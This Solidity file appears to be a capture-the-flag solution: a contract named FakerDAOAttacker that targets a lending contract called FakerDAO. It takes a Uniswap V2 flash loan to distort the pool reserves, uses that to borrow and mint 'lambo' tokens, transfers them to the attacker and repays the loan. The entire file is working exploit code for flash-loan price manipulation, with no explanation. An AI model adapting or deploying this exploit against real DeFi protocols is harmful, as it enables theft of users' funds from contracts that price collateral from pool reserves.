pragma solidity=0.6.6;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';
import '@uniswap/v2-periphery/contracts/libraries/SafeMath.sol';
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFakerDAO {
    function borrow(uint256 _amount) external;
}

contract FakerDAOAttacker {

    using SafeMath for uint256;

    address private uniswapFactory;
    address private yinToken;
    address private yangToken;
    address private fakerDAO;
    address private owner;

    constructor(
        address _uniswapFactory,
        address _yinToken,
        address _yangToken,
        address _fakerDAO
    ) public {
        uniswapFactory = _uniswapFactory;
        yinToken = _yinToken;
        yangToken = _yangToken;
        fakerDAO = _fakerDAO;
        owner = msg.sender;
    }

    // @dev fucks with the uniswap pool reserves, then mints lambo
    // @param amountToBorrow is amount of YANG token to borrow
    function startExploit(uint256 amountToBorrow) external {
        address pair = UniswapV2Library.pairFor(uniswapFactory,yinToken,yangToken);
        require(pair != address(0), "no pair.");

        IUniswapV2Pair(pair).swap(
            amountToBorrow, // YANG is token0
            0,
            address(this),
            bytes('not empty')
        );
    }

    // @dev callback function for the Uniswap flashloan
    function uniswapV2Call(
        address _sender, // address(this)
        uint _amount0,   // amount0Out (borrowed amount)
        uint _amount1,   // amount1Out
        bytes calldata _data
    ) external {
        address pair = UniswapV2Library.pairFor(uniswapFactory,yinToken,yangToken);
        require(msg.sender == pair, "invalid callback.");

        IUniswapV2Pair(pair).approve(fakerDAO,uint256(-1)); // approve fakerDAO to take collateral
        IFakerDAO(fakerDAO).borrow(1000); // mint lambo
        IERC20(fakerDAO).transfer(owner,1000); // transfer lambo to attacker

        uint256 loanPlusInterest = ((_amount0.mul(10**18).mul(1000)/997)/(10**18)).add(1); // amount owed for loan
        IERC20(yangToken).transfer(pair,loanPlusInterest); // pay back flashloan
    }

}